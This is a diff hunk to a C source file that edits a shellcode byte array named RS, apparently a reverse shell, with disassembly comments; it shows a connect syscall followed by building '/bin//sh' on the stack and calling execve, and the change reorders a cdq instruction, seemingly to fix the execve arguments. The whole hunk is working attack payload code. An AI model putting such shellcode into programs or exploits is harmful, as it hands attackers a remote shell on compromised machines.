@@ -24,14 +24,14 @@ char RS[] = {
   /* 0027 */ "\xb2\x10"                                 /* mov dl, 0x10                */
   /* 0029 */ "\xb0\x2a"                                 /* mov al, 0x2a                */
   /* 002B */ "\x0f\x05"                                 /* syscall                     */
-  /* 002D */ "\x52"                                     /* push rdx                    */
-  /* 002E */ "\x5e"                                     /* pop rsi                     */
-  /* 002F */ "\x52"                                     /* push rdx                    */
-  /* 0030 */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
-  /* 003A */ "\x51"                                     /* push rcx                    */
-  /* 003B */ "\x54"                                     /* push rsp                    */
-  /* 003C */ "\x5f"                                     /* pop rdi                     */
-  /* 003D */ "\x99"                                     /* cdq                         */
+  /* 002D */ "\x99"                                     /* cdq                         */
+  /* 002E */ "\x52"                                     /* push rdx                    */
+  /* 002F */ "\x5e"                                     /* pop rsi                     */
+  /* 0030 */ "\x52"                                     /* push rdx                    */
+  /* 0031 */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
+  /* 003B */ "\x51"                                     /* push rcx                    */
+  /* 003C */ "\x54"                                     /* push rsp                    */
+  /* 003D */ "\x5f"                                     /* pop rdi                     */
   /* 003E */ "\xb0\x3b"                                 /* mov al, 0x3b                */
   /* 0040 */ "\x0f\x05"                                 /* syscall                     */
 };
